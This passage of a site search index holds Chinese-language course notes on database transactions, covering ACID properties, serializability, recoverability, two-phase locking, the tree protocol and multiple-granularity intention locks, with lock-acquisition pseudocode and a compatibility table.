<p>Durability</p> <ul> <li>Concept\uff1a \u5982\u679c\u4e8b\u52a1\u7ed3\u679c\u662f <code>COMMIT</code>\uff0c\u5b83\u5bf9\u6570\u636e\u5e93\u7684\u5f71\u54cd\u9700\u8981\u6301\u7eed\u5b58\u5728\u3002</li> <li>Approach\uff1a DBMS \u53ef\u4ee5\u4f7f\u7528 Logging \u6216\u8005 Shadow Paging \u6765\u786e\u4fdd\u66f4\u6539\u662f Durable \u7684\u3002</li> </ul> <p>\u5f15\u64ce\u901a\u8fc7\u4ec0\u4e48\u6280\u672f\u4fdd\u8bc1\u4e8b\u52a1\u7684\u56db\u4e2a\u7279\u6027\u5462\uff1f</p> <ul> <li>\u6301\u4e45\u6027\u901a\u8fc7 redo log \u4fdd\u8bc1</li> <li>\u539f\u5b50\u6027\u901a\u8fc7 undo log \u4fdd\u8bc1</li> <li>\u9694\u79bb\u6027\u901a\u8fc7 MVCC(\u591a\u7248\u672c\u5e76\u53d1\u63a7\u5236) \u6216\u8005\u9501\u6765\u4fdd\u8bc1</li> <li>\u4e00\u81f4\u6027\u901a\u8fc7\u6301\u4e45\u6027+\u539f\u5b50\u6027+\u9694\u79bb\u6027\u4fdd\u8bc1</li> </ul> <p>\u4e00\u4e2a\u4e8b\u52a1\u5171\u6709\u4e94\u4e2a\u72b6\u6001\uff1a</p> <ul> <li>Active: \u521d\u59cb\u72b6\u6001\uff0c\u4e8b\u52a1\u6267\u884c\u4e2d\u4e00\u76f4\u5904\u4e8e Active</li> <li>Partially Commited: \u6240\u6709\u8bed\u53e5\u90fd\u6267\u884c\u5b8c\u6bd5\uff0c\u4f46\u8fd8\u6ca1\u6709 Commit\uff0c\u6b64\u65f6\u8981\u8f93\u51fa\u7684\u6570\u636e\u53ef\u80fd\u8fd8\u5728 Buffer \u4e2d</li> <li>Failed: \u65e0\u6cd5\u6b63\u5e38\u6267\u884c</li> <li>Aborted: Rollback\uff0c\u5e76\u5c06\u6570\u636e\u5e93\u6062\u590d\u81f3\u8be5\u4e8b\u52a1\u6267\u884c\u524d\u7684\u72b6\u6001\u3002Abort \u540e\u6709\u4e24\u79cd\u53ef\u9009\u65b9\u6848<ul> <li>&lt;1&gt; Restart Transaction<ul> <li>\u53ea\u6709\u65e0\u5185\u90e8\u903b\u8f91\u9519\u8bef\u53d1\u751f\u65f6\u53ef\u9009</li> </ul> </li> <li>&lt;2&gt; Kill Transaction</li> </ul> </li> <li>Committed: \u987a\u5229\u7ed3\u675f\u5e76\u63d0\u4ea4</li> </ul> <p></p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#concurrent-executions-schedules","title":"Concurrent Executions &amp; Schedules","text":"<p>\u5e76\u884c\u4e8b\u52a1\u53ef\u80fd\u5f15\u53d1\u7684\u95ee\u9898</p> <ul> <li>\u810f\u8bfb dirty read \u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\u5230\u4e86\u53e6\u4e00\u4e2a\u5c1a\u672a\u63d0\u4ea4\u7684\u4e8b\u52a1\u4fee\u6539\u8fc7\u540e\u7684\u6570\u636e</li> <li>\u4e0d\u53ef\u91cd\u590d\u8bfb non-repeatable read \u4e00\u4e2a\u4e8b\u52a1\u591a\u6b21\u8bfb\u53d6\u540c\u4e00\u6570\u636e\uff0c\u4f46\u662f\u524d\u540e\u4e24\u6b21\u8bfb\u5230\u7684\u6570\u636e\u4e0d\u4e00\u6837</li> <li>\u5e7b\u8bfb phantom read \u4e00\u4e2a\u4e8b\u52a1\u591a\u6b21\u67e5\u8be2\u67d0\u4e2a\u7b26\u5408\u67e5\u8be2\u6761\u4ef6\u7684\u300c\u8bb0\u5f55\u6570\u91cf\u300d\uff0c\u4f46\u662f\u524d\u540e\u4e24\u6b21\u67e5\u8be2\u5230\u7684\u6570\u91cf\u4e0d\u4e00\u6837</li> </ul> <p>\u5e76\u53d1\u6267\u884c\u7684\u4f18\u70b9</p> <ul> <li>\u589e\u52a0\u5904\u7406\u5668\u548c\u78c1\u76d8\u7684\u5229\u7528\u7387<ul> <li>\u4e00\u4e2a\u4e8b\u52a1\u8bfb\u5199\u78c1\u76d8\u7684\u540c\u65f6\uff0c\u53e6\u4e00\u4e2a\u4e8b\u52a1\u53ef\u4ee5\u4f7f\u7528 CPU</li> </ul> </li> <li>\u51cf\u5c11\u5e73\u5747\u54cd\u5e94\u65f6\u95f4<ul> <li>\u8f83\u77ed\u4e8b\u52a1\u4e0d\u7528\u7b49\u5f85\u8f83\u957f\u4e8b\u52a1\u7ed3\u675f</li> </ul> </li> </ul> <p>\u5e76\u53d1\u6267\u884c\u4f1a\u7834\u574f\u6570\u636e\u5e93\u7684\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5bf9\u6b63\u5728\u6267\u884c\u7684\u4e00\u7cfb\u5217\u4e8b\u52a1\u8fdb\u884c\u8c03\u5ea6\u3002Schedules \u6307\u5e76\u884c\u4e8b\u52a1\u6240\u6709\u6307\u4ee4\u7684\u6267\u884c\u987a\u5e8f\u3002</p> <p>\u4e00\u79cd\u6700\u7b80\u5355\u7684\u8c03\u5ea6\u4e3a Serial Schedule\uff0c\u5b83\u4e00\u5b9a\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u5e93\u7684\u4e00\u81f4\u6027\uff0c\u4f46\u662f\u6548\u7387\u4f4e\u4e0b\uff1a</p> <p></p> <p>N \u4e2a\u5e76\u884c\u4e8b\u52a1\u6709 N! \u79cd\u53ef\u9009\u7684\u4e32\u884c\u8c03\u5ea6</p> <p>\u4e0e\u4e4b\u76f8\u5bf9\u7684\u662f\u5e76\u884c\u8c03\u5ea6\uff0c\u5b83\u4e0d\u80fd\u4fdd\u8bc1\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u4ece Serializability \u548c Recoverability \u4e24\u4e2a\u65b9\u5411\u6765\u8bc4\u4ef7\u5b83\u3002</p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#serializability","title":"Serializability","text":"<p>\u5982\u679c\u4e00\u4e2a Schedule \u7b49\u4ef7\u4e8e Serial Schedule\uff0c\u6211\u4eec\u79f0\u5176\u4e3a Serializable \u7684\u3002\u5b83\u53ef\u4ee5\u7ec6\u5206\u4e3a\u51b2\u7a81\u53ef\u4e32\u884c\u5316\u4ee5\u53ca\u89c6\u56fe\u53ef\u4e32\u884c\u5316\uff0c\u672c\u8bfe\u7a0b\u53ea\u8981\u6c42 Conflict Serializability\u3002</p> <p>\u5bf9\u4e8e\u4e24\u4e2a\u4e8b\u52a1 \\(T_i, T_j\\) \u4e2d\u7684\u4e24\u6761\u5bf9\u540c\u4e00\u4e2a\u6570\u636e\u9879\u64cd\u4f5c\u7684\u6307\u4ee4 \\(I_i, I_j\\)\uff0c\u5f53\u4e14\u4ec5\u5f53\u5b83\u4eec\u5747\u4e3a\u8bfb\u64cd\u4f5c\uff0c\u5373 <code>READ(Q)</code> \u65f6\uff0c\u8ba4\u4e3a\u5b83\u4eec\u4e4b\u95f4\u4e0d\u4f1a\u53d1\u751f Conflict\u3002</p> <p>\u5bf9\u4e0d\u540c\u6570\u636e\u9879\u64cd\u4f5c\u7684\u6307\u4ee4\u90fd\u4e0d\u4f1a\u6709\u51b2\u7a81</p> <p>\u5982\u679c\u4e24\u4e2a\u64cd\u4f5c\u662f\u6709\u51b2\u7a81\u7684\uff0c\u5219\u4e8c\u8005\u6267\u884c\u6b21\u5e8f\u4e0d\u80fd\u4ea4\u6362\uff1b\u82e5\u65e0\u51b2\u7a81\uff0c\u5219\u53ef\u4ee5\u4ea4\u6362\u3002\u90a3\u4e48\u5982\u679c\u4e00\u4e2a Schedule \\(S\\) \u53ef\u4ee5\u901a\u8fc7\u4ea4\u6362\u4e00\u7cfb\u5217\u65e0\u51b2\u7a81\u6307\u4ee4\u53d8\u4e3a \\(S'\\)\uff0c\u5219\u79f0 \\(S\\) \u548c \\(S'\\) \u4e3a Conflict Equivalent \u7684\u3002</p> <p>\u6839\u636e\u4ee5\u4e0a\u5b9a\u4e49\uff0c\u6211\u4eec\u5982\u679c\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u5e76\u884c\u8c03\u5ea6 \\(S\\) \u4e0e\u4e32\u884c\u8c03\u5ea6 Conflict Equivalent\uff0c\u5219\u8be5\u8c03\u5ea6\u662f Conflict Serializable \u7684\u3002</p> <p></p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#recoverability","title":"Recoverability","text":"<p>Recoverability \u7528\u4e8e\u8bc4\u4ef7\u4e00\u4e2a\u8c03\u5ea6\u5bf9\u4e8e\u5e76\u884c\u4e8b\u52a1\u5931\u8d25\u7684\u53ef\u6062\u590d\u6027\u3002\u4e00\u4e2a Recoverable Schedule \u8981\u6c42\uff1a</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u8981\u8bfb\u53d6\u6570\u636e\u9879 \\(A\\) \u7684\u4e8b\u52a1 \\(T_j\\)\uff0c\u5982\u679c \\(A\\) \u5728\u8bfb\u53d6\u4e4b\u524d\u88ab\u4e8b\u52a1 \\(T_i\\) \u4fee\u6539\u8fc7\uff0c\u5219\u4e8b\u52a1 \\(T_i\\) \u7684 <code>COMMIT</code> \u64cd\u4f5c\u8981\u65e9\u4e8e \\(T_j\\) \u7684 <code>COMMIT</code> \u64cd\u4f5c\u3002</p> <p>\u5982\u4e0b\u662f\u4e00\u4e2a\u7b80\u5355\u7684 NOT Recoverable \u7684\u4f8b\u5b50\uff0c\u5982\u679c\u4e8b\u52a1 \\(T_8\\) Abort \u4e86\u7684\u8bdd\uff0c\u90a3\u4e48 <code>WRITE(A)</code> \u7684\u64cd\u4f5c\u4e5f\u88ab\u56de\u6eda\uff0c\u5219\u5df2\u7ecf\u63d0\u4ea4\u4e86\u7684\u4e8b\u52a1 \\(T_9\\) \u7684 <code>READ(A)</code> \u8bfb\u53d6\u5230\u7684\u503c\u662f\u9519\u8bef\u7684\uff0c\u6570\u636e\u5e93\u5b8c\u6574\u6027\u53d7\u635f\uff1a</p> <p></p> <p>\u90a3\u4e48\u5982\u679c\u4e00\u4e2a\u4e8b\u52a1 Abort \u4e86\u7684\u8bdd\uff0c\u5176\u5b83\u76f8\u5e94\u7684\u4e8b\u52a1\u4e5f\u8981\u4e00\u8d77\u7ec8\u6b62\uff0c\u8fd9\u88ab\u79f0\u4e3a Cascading Rollback\uff1a</p> <p></p> <p>Cascading Rollbacks \u53ef\u80fd\u5bfc\u81f4\u5de8\u5927\u7684\u5f00\u9500\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u4e0d\u671f\u671b\u7684</p> <p>\u5982\u679c\u4e00\u4e2a Schedule \u4e2d\uff0c\u5bf9\u4e8e\u4efb\u610f\u4e00\u7ec4\u5bf9\u540c\u4e00\u4e2a\u6570\u636e\u9879\u5148\u5199\u540e\u8bfb\u7684\u4e8b\u52a1 \\(T_i, T_j\\)\uff0c\u5982\u679c \\(T_i\\) \u7684 <code>COMMIT</code> \u64cd\u4f5c\u5728 \\(T_j\\) \u7684\u8bfb\u64cd\u4f5c\u4e4b\u524d\uff0c\u5373 \\(T_j\\) \u4e0d\u9700\u8981\u8ddf\u7740 \\(T_i\\) \u4e00\u8d77 <code>ROLLBACK</code>\uff0c\u5219\u79f0\u8be5\u8c03\u5ea6\u4e3a Cascadeless Schedules\u3002</p> <p>\u5982\u679c\u4ec5\u60f3\u7ef4\u6301 Recoverability \u7684\u8bdd\uff0c\u53ea\u8981 \\(T_i\\) \u7684 <code>COMMIT</code> \u5728 \\(T_j\\) \u7684 <code>COMMIT</code> \u524d\u5c31\u597d\u4e86\u3002</p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#lock-based-protocols","title":"Lock-Based Protocols","text":"<p>Serializable Schedule \u662f\u5e76\u884c\u63a7\u5236\u7684\u57fa\u7840\uff0cDBMS \u4f7f\u7528 Locks \u4e3a\u4e8b\u52a1\u52a8\u6001\u751f\u6210\u53ef\u4e32\u884c\u5316\u7684\u8c03\u5ea6\uff0c\u8fd9\u4e9b\u9501\u5728\u5e76\u53d1\u8bbf\u95ee\u4e0b\u4fdd\u62a4\u6570\u636e\u5bf9\u8c61\uff1a</p> <ul> <li>Shared Lock\uff08S\uff09: \u53ea\u5141\u8bb8\u8be5\u5bf9\u8c61\u88ab\u5176\u5b83\u4e8b\u52a1\u8bfb\u53d6\u3002<ul> <li>\u5982\u679c\u4e00\u4e2a\u4e8b\u52a1\u6301\u6709 Shared Lock\uff0c\u53e6\u4e00\u4e2a\u4e8b\u52a1\u4ecd\u7136\u53ef\u4ee5\u83b7\u53d6\u76f8\u540c\u7684 Shared Lock</li> </ul> </li> <li>Exclusive Lock\uff08X\uff09: \u6392\u5b83\u9501\u53ea\u5141\u8bb8\u4e00\u4e2a\u4e8b\u52a1\u4fee\u6539\u5bf9\u8c61\uff0c\u5e76\u4e14\u4f1a\u963b\u6b62\u5176\u5b83\u4e8b\u52a1\u83b7\u53d6\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u7684\u4efb\u4f55\u9501</li> </ul> <p>\u90a3\u4e48\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u5199\u4e00\u4e2a\u6570\u636e\uff0c\u5219\u7533\u8bf7\u4e00\u4e2a X \u9501\uff1b\u5982\u679c\u53ea\u9700\u8981\u8bfb\u4e00\u4e2a\u6570\u636e\uff0c\u5219\u7533\u8bf7\u4e00\u4e2a S \u9501\u3002\u5982\u679c\u7533\u8bf7\u88ab\u62d2\u7edd\u4e86\uff0c\u5219\u6211\u4eec\u9700\u8981\u4e00\u76f4\u7b49\u5f85\u5230\u8be5\u5bf9\u8c61\u5148\u524d\u7684\u9501\u88ab\u91ca\u653e\uff0c\u81ea\u5df1\u6210\u529f\u83b7\u5f97\u8be5\u9501\u65f6\u624d\u80fd\u7ee7\u7eed\u6267\u884c\u3002</p> <p>DeadLock</p> <p>Deadlock\uff08\u6b7b\u9501\uff09 \u4e3a\u5f53\u4e00\u7ec4\u4e8b\u52a1\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u6301\u6709\u7684\u8d44\u6e90\uff08\u9501\uff09\u91ca\u653e\uff0c\u4ece\u800c\u90fd\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c\u7684\u72b6\u6001\u3002</p> <p>\u6b7b\u9501\u662f\u5e76\u53d1\u63a7\u5236\u4e2d\u65e0\u6cd5\u5b8c\u5168\u907f\u514d\u7684\u73b0\u8c61\uff0c\u53ea\u80fd\u901a\u8fc7\u9884\u9632\u3001\u907f\u514d\u3001\u68c0\u6d4b\u4e0e\u6062\u590d\u7b49\u624b\u6bb5\u6765\u7ba1\u7406\u3002</p> <p>Two-Phase Locking \u5c5e\u4e8e\u00a0Pessimistic\u00a0\u5e76\u53d1\u63a7\u5236\u534f\u8bae\uff0c\u5e76\u4e14\u8be5\u534f\u8bae\u4e0d\u9700\u8981\u63d0\u524d\u77e5\u9053\u4e8b\u52a1\u5c06\u6267\u884c\u7684\u6240\u6709\u67e5\u8be2\u64cd\u4f5c\u3002</p> <ul> <li>Phase 1 - Growing:\u00a0\u5728 Growing \u9636\u6bb5\uff0c\u6bcf\u4e2a\u4e8b\u52a1\u90fd\u4ece DBMS \u7684 Lock Manager \u8bf7\u6c42\u5b83\u9700\u8981\u7684\u9501\uff0cLock Manager \u6388\u6743/\u62d2\u7edd\u8fd9\u4e9b\u8bf7\u6c42<ul> <li>\u5141\u8bb8\u5c06 S \u9501\u5347\u7ea7\u4e3a X \u9501</li> </ul> </li> <li>Phase 2- Shrinking:\u00a0\u4e8b\u52a1\u5728\u91ca\u653e\u5b83\u4eec\u7684\u7b2c\u4e00\u4e2a Lock \u65f6\u8fdb\u5165 Shrinking \u9636\u6bb5\uff0c\u5728\u6b64\u9636\u6bb5\u53ea\u5141\u8bb8\u4e8b\u52a1\u91ca\u653e Lock\uff0c\u5e76\u4e14\u4e0d\u80fd\u83b7\u53d6\u65b0\u7684\u9501<ul> <li>\u5141\u8bb8\u5c06 X \u9501\u964d\u7ea7\u4e3a S \u9501</li> <li>\u5982\u679c\u4e8b\u52a1\u5df2\u7ecf\u8bbf\u95ee\u5b8c\u4e86\u6240\u6709\u9700\u8981\u8bbf\u95ee\u7684\u6570\u636e\u9879\uff0c\u5219\u53ef\u4ee5\u5f00\u59cb\u91ca\u653e\u9501\uff0c\u8fdb\u5165 Shrink \u9636\u6bb5</li> </ul> </li> </ul> <p>\u8be5\u63a7\u5236\u534f\u8bae\u80fd\u591f\u786e\u4fdd\u5f97\u5230\u4e00\u4e2a Conflict Serializable Schedule\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e24\u4e2a\u9636\u6bb5\u7684\u5206\u754c\u7ebf Lock Point \u7684\u65f6\u95f4\u987a\u5e8f\u6765\u5f97\u5230\u53ef\u4e32\u884c\u5316\u7684\u6267\u884c\u987a\u5e8f\u3002</p> <p>\u5982\u679c Precedence Graph \u4e2d\u5b58\u5728\u8fb9 \\(T_i \\rightarrow T_j\\)\uff0c\u5219\u8fd9\u4e24\u4e2a\u4e8b\u52a1\u7684 lock point \u4e00\u5b9a\u6ee1\u8db3 \\(\\alpha_i &lt; \\alpha_j\\)</p> <p>Warning</p> <ul> <li>Two-Phase Locking \u4e0d\u4fdd\u8bc1\u6ca1\u6709\u6b7b\u9501\u7684\u53d1\u751f</li> <li>Two-Phase Locking \u4e0d\u4fdd\u8bc1\u6ca1\u6709 Cascading Rollback \u7684\u53d1\u751f\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u52a0\u5f3a\u7248\u534f\u8bae Strict Two-Phase Locking \u6765\u89e3\u51b3<ul> <li>\u5373\u4e00\u4e2a\u4e8b\u52a1\u7684\u6392\u4ed6\u9501\u53ea\u6709 <code>COMMIT</code> \u6216 <code>ABORT</code> \u65f6\u624d\u80fd\u91ca\u653e</li> <li><code>sql R1(A) -- T1 \u52a0\u9501 S(A) W1(A) -- T1 \u5347\u7ea7\u4e3a X(A)\uff0c\u5199\u5b8c\u540e\u91ca\u653e\u9501 R2(A) -- T2 \u52a0\u9501 S(A) ... T1 Abort -- T1 \u56e0\u4e3a\u67d0\u4e9b\u9519\u8bef\u9700\u8981\u56de\u6eda</code></li> </ul> </li> <li>Two-Phase Locking \u662f\u5f97\u5230 Conflict Serializable Schedule \u7684\u5145\u5206\u6761\u4ef6\uff0c\u800c\u4e0d\u662f\u5fc5\u8981\u6761\u4ef6\uff0c\u8fd9\u4e5f\u8bf4\u660e\u5b58\u5728\u4e0d\u80fd\u7531\u8be5\u534f\u8bae\u5f97\u5230\u7684 Conflict Serializable Schedule<ul> <li>\u4f8b\u5982\u4e8b\u52a1 <code>R1(A),R1(B),W1(B),R2(A),R2(B),W2(A)</code> \u662f\u51b2\u7a81\u53ef\u4e32\u884c\u5316\u7684\uff0c\u5b83\u7684\u524d\u9a71\u56fe\u53ea\u6709\u4e24\u6761 \\(T_1\\) \u5230 \\(T_2\\) \u7684\u8fb9\uff1b\u4f46\u662f\u5047\u8bbe\u4f7f\u7528 2PL \u534f\u8bae\u6765\u8fbe\u6210\u8be5\u8c03\u5ea6\uff0c\u5219\u7533\u8bf7 X \u9501\u65f6\u4f1a\u9020\u6210\u6b7b\u9501</li> </ul> </li> </ul> <code>READ(D)</code><code>WRITE(D)</code> <pre><code>if T_i has a lock on D:\n    read(D)\nelse:\n    if wait until no other txn has a lock-X on D:\n        lock-S(D)\n        read(D)\n</code></pre> <pre><code>if T_i has a lock-X on D:\n    write(D)\nelse:\n    if wait until no other txt has any lock on D:\n        if T_i has lock-S on D:\n            upgrade lock-S to lock-X\n        else:\n            lock-X(D)\n        write(D)\n</code></pre> <p>DBMS \u4e2d\uff0c\u901a\u8fc7\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b Lock Manager \u6765\u5904\u7406\u4e8b\u52a1\u7684\u9501\u8bf7\u6c42\u3002\u5728\u7ba1\u7406\u5668\u5185\u90e8\u7ef4\u62a4\u4e86\u4e00\u4e2a Lock-Table \u8868\uff0c\u91cc\u9762\u5b58\u50a8\u4e86\u54ea\u4e9b\u4e8b\u52a1\u6301\u6709\u9501\u4ee5\u53ca\u54ea\u4e9b\u4e8b\u52a1\u6b63\u5728\u7b49\u5f85\u9501\u7684\u4fe1\u606f\u3002</p> <p>\u901a\u5e38\uff0cLock-Table \u88ab\u5b9e\u73b0\u4e3a\u5185\u5b58\u4e2d\u6839\u636e\u6570\u636e\u9879\u7684\u540d\u79f0\u6765\u54c8\u5e0c\u7684\u54c8\u5e0c\u8868</p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#graph-based-protocols","title":"Graph-Based Protocols","text":"<p>Graph-Based Protocols \u662f 2PL \u7684\u4e00\u4e2a\u66ff\u4ee3\uff0c\u5b83\u7528 \\(d_i\\rightarrow d_j\\) \u8868\u793a\u6570\u636e\u9879\u4e4b\u95f4\u7684\u5148\u540e\u5173\u7cfb\uff0c\u4e14\u4efb\u610f\u540c\u65f6\u8bbf\u95ee\u4e86 \\(d_i, d_j\\) \u7684\u4e8b\u52a1\u90fd\u5fc5\u987b\u6ee1\u8db3\u8bbf\u95ee \\(d_i\\) \u65e9\u4e8e \\(d_j\\)\u3002</p> <p>\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u7ed8\u5236\u7684 Directed Acyclic Graph \u79f0\u4e3a Database Graph\u3002\u6211\u4eec\u4ee5\u4e00\u79cd\u7b80\u5355\u7684 Graph-Based \u534f\u8bae Tree Protocol \u6765\u7b80\u5355\u8bb2\u89e3\u5176\u57fa\u672c\u903b\u8f91\u3002</p> <p></p> <ul> <li>&lt;1&gt; \u53ea\u5141\u8bb8\u4f7f\u7528\u6392\u4ed6\u9501 Exclusive Lock</li> <li>&lt;2&gt; \u5bf9\u4e8e\u4efb\u610f\u4e8b\u52a1 \\(T_i\\)\uff0c\u5176\u52a0\u9501\u7684\u7b2c\u4e00\u4e2a\u4e8b\u52a1\u53ef\u4ee5\u662f Tree \u4e2d\u4efb\u610f\u4e00\u4e2a\u8282\u70b9\uff0c\u4f46\u662f\u540e\u6765\u52a0\u9501\u7684\u6570\u636e\u9879\u5fc5\u987b\u662f\u5f53\u524d\u5df2\u62e5\u6709\u9501\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9</li> <li>&lt;3&gt; \u6570\u636e\u9879\u53ef\u4ee5\u968f\u65f6\u89e3\u9501\uff0c\u4f46\u662f\u5df2\u7ecf\u89e3\u9501\u7684\u6570\u636e\u9879\u540e\u9762\u4e0d\u80fd\u518d\u6b21\u4e0a\u9501</li> </ul> <p></p> AdvantageDisadvantage <ul> <li>Tree Protocol \u4fdd\u8bc1 Conflict Serialzability \u548c Freedom From Deadlock<ul> <li>Deadlock Free \u4e5f\u610f\u5473\u7740\u4e0d\u9700\u8981 Rollback</li> </ul> </li> <li>\u76f8\u6bd4\u4e8e 2PL\uff0c\u53ef\u4ee5\u66f4\u65e9\u5bf9\u6570\u636e\u9879\u89e3\u9501<ul> <li>\u610f\u5473\u7740\u66f4\u77ed\u7684\u7b49\u5f85\u65f6\u95f4\uff0c\u4ee5\u53ca\u5e76\u884c\u6027\u7684\u589e\u52a0</li> </ul> </li> </ul> <ul> <li>\u4e0d\u4fdd\u8bc1 Recoverability \u548c Freedom of Cascade</li> <li>\u4e8b\u52a1\u53ef\u80fd\u9700\u8981\u5bf9\u4e00\u4e9b\u5b83\u4eec\u4e0d\u8bbf\u95ee\u7684\u6570\u636e\u9879\u4e0a\u9501\uff0c\u624d\u80fd\u4e0a\u9501\u4e0b\u5c42\u7684\u5b50\u8282\u70b9<ul> <li>\u589e\u52a0\u4e86\u9501\u5f00\u9500\u548c\u7b49\u5f85\u65f6\u95f4\uff0c\u53ef\u80fd\u4f1a\u964d\u4f4e\u5e76\u53d1\u5ea6</li> </ul> </li> </ul>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#multiple-granularity","title":"Multiple Granularity","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u4fbf\u5229\u6027\uff0c\u6211\u4eec\u5141\u8bb8\u6839\u636e\u9700\u8981\u4ee5\u4e0d\u540c\u5927\u5c0f\u6765\u4e0a\u9501\u6570\u636e\u9879\uff0c\u5373 Multiple Granularity\u3002\u6211\u4eec\u6839\u636e Data Granularities \u5212\u5206\u51fa\u5c42\u6b21\uff0c\u5c06\u5176\u8868\u793a\u4e3a Tree \u7684\u5f62\u5f0f\uff1a</p> <p></p> <p>\u5f53\u4e00\u4e2a\u4e8b\u52a1\u663e\u5f0f\u5730\u5bf9\u4e00\u4e2a\u8282\u70b9\u4e0a\u9501\u65f6\uff0c\u5b83\u8fd8\u4f1a\u9690\u5f0f\u5730\u5bf9\u5176\u6240\u6709\u540e\u4ee3\u90fd\u52a0\u4e0a\u540c\u6837\u7684\u9501\u3002</p> <p>Granularity of Locking</p> <ul> <li>Fine Granularity(\u7ec6\u7c92\u5ea6\uff0clower in the tree): high concurrency, high locking overhead<ul> <li>\u4e3a\u4ec0\u4e48\u7ec6\u7c92\u5ea6\u5e26\u6765\u66f4\u9ad8\u9501\u5f00\u9500\uff1f\u7cfb\u7edf\u4e2d\u5b58\u5728\u5927\u91cf\u9501\u5bf9\u8c61\uff0c\u4e5f\u9700\u8981\u66f4\u9891\u7e41\u7684\u52a0\u9501/\u89e3\u9501\u64cd\u4f5c\uff0c\u56e0\u6b64\u9700\u8981\u66f4\u591a\u7684\u9501\u7ba1\u7406\u3001\u8c03\u5ea6\u7b49\u8d44\u6e90</li> </ul> </li> <li>Coarse Granularity(\u7c97\u7c92\u5ea6\uff0chigher in the tree): low locking overhead, low concurrency</li> </ul> <p>\u5982\u679c\u4e8b\u52a1 \\(T_1\\) \u5bf9 \\(r_{a1}\\) \u65bd\u52a0\u6392\u4ed6\u9501\u540e\uff0c\u4e8b\u52a1 \\(T_2\\) \u60f3\u8981\u5bf9\u6574\u4e2a DB \u65bd\u52a0\u5171\u4eab\u9501\uff0c\u90a3\u4e48\u5b83\u5c31\u9700\u8981\u626b\u63cf\u6574\u68f5\u6811\u6765\u786e\u5b9a\u8282\u70b9 'DB' \u7684\u540e\u4ee3\u662f\u5426\u5b58\u5728\u6392\u4ed6\u9501\uff0c\u8fd9\u81ea\u7136\u662f\u6211\u4eec\u4e0d\u80fd\u63a5\u53d7\u7684\u5f00\u9500\u3002\u56e0\u6b64\u6211\u4eec\u63d0\u51fa\u610f\u5411\u9501 Intention Lock \u4f5c\u4e3a\u4e00\u4e2a\u72b6\u6001\u3002</p> <p>\u5728\u8282\u70b9\u88ab\u663e\u5f0f\u4e0a\u9501\u524d\uff0c\u5148\u5bf9\u8be5\u8282\u70b9\u7684\u6240\u6709\u7956\u5148\u90fd\u65bd\u52a0 Intention Locks</p> <ul> <li>Intention-Shared(IS): \u8868\u660e\u5176\u540e\u4ee3\u4e2d\u5b58\u5728 S \u9501</li> <li>Intention-Exclusive(IX): \u8868\u660e\u5176\u540e\u4ee3\u4e2d\u5b58\u5728 X \u9501</li> <li>Shared and Intention-Exclusive(SIX): \u5f53\u524d\u8282\u70b9\u6b63\u5904\u4e8e\u5171\u4eab\u9501\u72b6\u6001\uff0c\u4e0d\u8fc7\u4e8b\u52a1\u6b63\u5728\u5bf9\u5176\u540e\u4ee3\u67d0\u4e2a\u8282\u70b9\u65bd\u52a0\u6392\u4ed6\u9501<ul> <li><code>S + IX</code> \u76f8\u5f53\u4e8e\u544a\u8bc9\u5176\u5b83\u4e8b\u52a1\uff0c\u6211\u7684\u786e\u5728\u8fd9\u4e2a\u8282\u70b9\u53ea\u8bfb\uff0c\u4f46\u6211\u9a6c\u4e0a\u4f1a\u53bb\u4e0b\u5c42\u505a\u6392\u4ed6\u64cd\u4f5c\uff0c\u8bf7\u522b\u4e0e\u6211\u51b2\u7a81</li> <li>\u4e00\u4e2a\u4e8b\u52a1\u60f3\u8981\u8bfb\u53d6\u6574\u5f20\u8868\u7684\u4e00\u90e8\u5206\u5185\u5bb9\uff0c\u540c\u65f6\u5b83\u8fd8\u6253\u7b97\u5bf9\u8fd9\u5f20\u8868\u4e2d\u7684\u67d0\u4e9b\u884c\u505a\u66f4\u65b0\uff08\u56e0\u6b64\u8981\u5bf9\u90a3\u4e9b\u884c\u83b7\u53d6 X \u9501\uff09\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u9700\u8981\u5728\u201c\u8868\u7ea7\u522b\u201d\u62ff\u4e00\u4e2a SIX \u9501</li> </ul> </li> </ul> \u5df2\u6709\u9501  \u7533\u8bf7\u9501 IS IX S SIX X IS \u2705 \u2705 \u2705 \u2705 \u274c IX \u2705 \u2705 \u274c \u274c \u274c S \u2705 \u274c \u2705 \u274c \u274c SIX \u2705 \u274c \u274c \u274c \u274c X \u274c \u274c \u274c \u274c \u274c <p>Warning</p> <p>\u4e24\u4e2a\u4e8b\u52a1\u4e4b\u95f4\u7684 SIX \u9501\u662f\u4e0d\u517c\u5bb9\u7684\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e8b\u52a1\u53ef\u4ee5\u5b89\u5168\u8bfb\u53d6\u5e76\u5199\u5165\uff0c\u5176\u5b83\u4e8b\u52a1\u8981\u4e48\u5728\u66f4\u4f4e\u5c42\u7ea7\u7533\u8bf7\u5171\u4eab\u9501\uff0c\u8981\u4e48\u7b49\u5f85\u524d\u4e00\u4e2a\u4e8b\u52a1\u5b8c\u6210\u64cd\u4f5c\u518d\u52a0\u9501\u3002</p> <p>\u5728\u8fd9\u79cd\u591a\u7c92\u5ea6\u7684\u5c42\u6b21\u4e0b\uff0cLocking Scheme 